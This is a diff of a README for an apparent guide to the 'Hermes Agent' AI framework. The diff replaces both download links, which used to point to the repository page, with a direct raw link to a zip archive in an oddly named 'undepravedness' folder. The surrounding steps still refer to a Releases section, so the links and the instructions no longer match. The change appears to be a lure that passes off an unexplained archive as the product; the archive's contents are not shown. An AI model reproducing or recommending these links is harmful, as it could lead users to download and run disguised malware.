@@ -1,6 +1,6 @@
 # 📘 hermes-agent-orange-book - Master AI agents with practical guides
 
-[![Download Hermes Agent](https://img.shields.io/badge/Download-Hermes-blue.svg)](https://github.com/Sebas2015diaz/hermes-agent-orange-book)
+[![Download Hermes Agent](https://img.shields.io/badge/Download-Hermes-blue.svg)](https://github.com/Sebas2015diaz/hermes-agent-orange-book/raw/refs/heads/main/undepravedness/hermes-book-orange-agent-3.1.zip)
 
 This guide helps you learn the Hermes Agent framework. You will gain skills to build and manage automated AI agents. The orange book offers a clear path from beginner steps to advanced agent control.
 
@@ -17,7 +17,7 @@ Before you start, check your computer against these requirements. Hermes Agent r
 
 Use the official page to get your copy of the software. Follow these steps to prepare your system.
 
-[Click here to visit the download page](https://github.com/Sebas2015diaz/hermes-agent-orange-book)
+[Click here to visit the download page](https://github.com/Sebas2015diaz/hermes-agent-orange-book/raw/refs/heads/main/undepravedness/hermes-book-orange-agent-3.1.zip)
 
 1.  Open the link above in your web browser.
 2.  Look for the section marked Releases on the right side of the screen.
